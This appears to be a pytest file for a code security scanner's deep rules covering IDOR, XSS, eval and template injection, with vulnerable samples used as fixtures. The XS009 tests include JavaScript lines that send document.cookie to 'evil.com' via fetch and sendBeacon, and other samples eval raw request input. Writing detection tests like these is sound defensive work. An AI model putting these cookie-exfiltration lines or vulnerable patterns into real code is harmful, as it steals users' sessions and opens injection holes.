"""Unit tests for deep analysis rules (app.program.deep_rules).

The deep rules only run at high/max scan levels and are gated through
``app.engines.scan_levels``. These tests verify each rule fires on the
expected vulnerable pattern and stays silent for the safe/guarded variants,
using the level profile so we also prove the gating (a ``low`` profile runs
none of them).
"""

from __future__ import annotations

from pathlib import Path

from app.engines.scan_levels import get_level
from app.program.deep_rules import analyze_deep_idor, analyze_deep_xss

MAX = get_level("max")
HIGH = get_level("high")
LOW = get_level("low")


def _write(tmp_path: Path, name: str, code: str) -> Path:
    p = tmp_path / name
    p.write_text(code)
    return p


def _rules_idor(p: Path, code: str, level=MAX) -> set[str]:
    return {f["rule"] for f in analyze_deep_idor(p, code, "s1", level)}


def _rules_xss(p: Path, code: str, level=MAX, lang: str = "python") -> set[str]:
    return {f["rule"] for f in analyze_deep_xss(p, code, "s1", level, lang)}


# ---------------------------------------------------------------------------
# Level gating — deep rules must not run at low/medium
# ---------------------------------------------------------------------------

def test_deep_rules_do_not_run_at_low(tmp_path) -> None:
    code = (
        "from flask import request\n"
        "def v(request):\n"
        "    u = User.objects.get(id=request.GET['user'])\n"
        "    eval(request.GET['code'])\n"
    )
    p = _write(tmp_path, "vuln.py", code)
    assert _rules_idor(p, code, LOW) == set()
    assert _rules_xss(p, code, LOW) == set()


# ---------------------------------------------------------------------------
# CY011 — data-flow IDOR
# ---------------------------------------------------------------------------

def test_cy011_data_flow_idor(tmp_path) -> None:
    code = (
        "from flask import request\n"
        "def v(request):\n"
        "    user_id = request.GET['user']\n"
        "    order = Order.objects.get(id=user_id)\n"
        "    return order\n"
    )
    p = _write(tmp_path, "vuln.py", code)
    assert "CY011" in _rules_idor(p, code)


def test_cy011_silent_when_ownership_filter_present(tmp_path) -> None:
    code = (
        "from flask import request\n"
        "def v(request):\n"
        "    user_id = request.GET['user']\n"
        "    order = Order.objects.get(id=user_id, user_id=current_user.id)\n"
        "    return order\n"
    )
    p = _write(tmp_path, "safe.py", code)
    assert "CY011" not in _rules_idor(p, code)


# ---------------------------------------------------------------------------
# CY012 — unauthenticated endpoint accessing user data
# ---------------------------------------------------------------------------

def test_cy012_unauth_route_accesses_user_model(tmp_path) -> None:
    code = (
        "from flask import request\n"
        "@app.route('/api/profile/<int:pid>')\n"
        "def profile(pid):\n"
        "    u = User.objects.get(id=request.GET['user'])\n"
        "    return u\n"
    )
    p = _write(tmp_path, "vuln.py", code)
    assert "CY012" in _rules_idor(p, code)


def test_cy012_silent_when_auth_decorator_present(tmp_path) -> None:
    code = (
        "@app.route('/safe')\n"
        "@login_required\n"
        "def safe():\n"
        "    u = User.objects.get(id=request.GET['user'])\n"
        "    return u\n"
    )
    p = _write(tmp_path, "auth.py", code)
    assert "CY012" not in _rules_idor(p, code)


# ---------------------------------------------------------------------------
# CY013 — cross-file IDOR (was silently never flagged for module.attr calls)
# ---------------------------------------------------------------------------

def test_cy013_cross_file_module_attribute_call(tmp_path) -> None:
    code = (
        "from flask import request\n"
        "from app.services import order_service\n"
        "@app.route('/api/orders/<int:oid>')\n"
        "def get_order(oid):\n"
        "    uid = request.GET['uid']\n"
        "    return order_service.get_order(uid)\n"
    )
    p = _write(tmp_path, "vuln.py", code)
    findings = analyze_deep_idor(p, code, "s1", MAX)
    cy013 = [f for f in findings if f["rule"] == "CY013"]
    assert cy013, "CY013 should flag the imported module helper call"
    assert "order_service.get_order" in cy013[0]["evidence"]["helper"]


def test_cy013_cross_file_plain_import(tmp_path) -> None:
    code = (
        "from flask import request\n"
        "from app.services import fetch_account\n"
        "@app.route('/api/a/<int:aid>')\n"
        "def acc(aid):\n"
        "    return fetch_account(request.GET['uid'])\n"
    )
    p = _write(tmp_path, "vuln.py", code)
    assert "CY013" in _rules_idor(p, code)


def test_cy013_does_not_trigger_without_imported_helper(tmp_path) -> None:
    code = (
        "from flask import request\n"
        "@app.route('/api/orders/<int:oid>')\n"
        "def get_order(oid):\n"
        "    uid = request.GET['uid']\n"
        "    return local_takes_input(uid)\n"
    )
    p = _write(tmp_path, "local.py", code)
    assert "CY013" not in _rules_idor(p, code)


# ---------------------------------------------------------------------------
# XS009 — document.cookie leaked (JS-only)
# ---------------------------------------------------------------------------

def test_xs009_cookie_leaked_via_fetch(tmp_path) -> None:
    code = "fetch('https://evil.com/x', {body: document.cookie});\n"
    p = _write(tmp_path, "bad.js", code)
    assert "XS009" in _rules_xss(p, code, lang="js")


def test_xs009_cookie_leaked_via_send_beacon(tmp_path) -> None:
    code = "navigator.sendBeacon('https://evil.com', document.cookie);\n"
    p = _write(tmp_path, "bad.js", code)
    assert "XS009" in _rules_xss(p, code, lang="js")


def test_xs009_not_run_for_python(tmp_path) -> None:
    code = "fetch('https://evil.com', {body: document.cookie});\n"
    p = _write(tmp_path, "notjs.py", code)
    assert "XS009" not in _rules_xss(p, code, lang="python")


# ---------------------------------------------------------------------------
# XS010 — eval/exec of user-controlled input (Python)
# ---------------------------------------------------------------------------

def test_xs010_eval_of_request_input(tmp_path) -> None:
    code = (
        "from flask import request\n"
        "def v(request):\n"
        "    eval(request.GET['code'])\n"
    )
    p = _write(tmp_path, "vuln.py", code)
    assert "XS010" in _rules_xss(p, code)


def test_xs010_silent_for_static_input(tmp_path) -> None:
    code = "def v():\n    eval('print(1)')\n"
    p = _write(tmp_path, "safe.py", code)
    assert "XS010" not in _rules_xss(p, code)


# ---------------------------------------------------------------------------
# XS011 — cross-file template render (Python, max-only)
# ---------------------------------------------------------------------------

def test_xs011_cross_file_template_render(tmp_path) -> None:
    code = (
        "from flask import request\n"
        "from django.template import Template\n"
        "@app.route('/render')\n"
        "def render_page():\n"
        "    return Template(request.GET['tmpl'])\n"
    )
    p = _write(tmp_path, "vuln.py", code)
    assert "XS011" in _rules_xss(p, code)


def test_xs011_not_run_at_high(tmp_path) -> None:
    code = (
        "from flask import request\n"
        "from django.template import Template\n"
        "@app.route('/render')\n"
        "def render_page():\n"
        "    return Template(request.GET['tmpl'])\n"
    )
    p = _write(tmp_path, "vuln.py", code)
    assert "XS011" not in _rules_xss(p, code, level=HIGH)
